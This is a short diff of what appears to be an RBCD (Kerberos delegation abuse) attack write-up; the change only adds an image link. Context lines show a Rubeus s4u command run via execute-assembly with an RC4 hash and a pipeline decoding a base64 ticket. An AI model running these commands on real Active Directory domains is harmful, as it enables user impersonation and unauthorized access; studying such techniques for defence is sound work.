@@ -47,6 +47,8 @@ execute-assembly /tmp/Rubeus.exe s4u /user:JAKI2 /rc4:32ed87bdb5fdc5e9cba8854737
 
 ![Image](/img/rbcd/3.png)
 
+![Image](/img/rbcd/4.png)
+
 ```
 cat /tmp/ticket_b64 | sed /^$/d | tr -d '\r\n' | sed -e "s/ //g" | base64 -d > /tmp/ticket
 
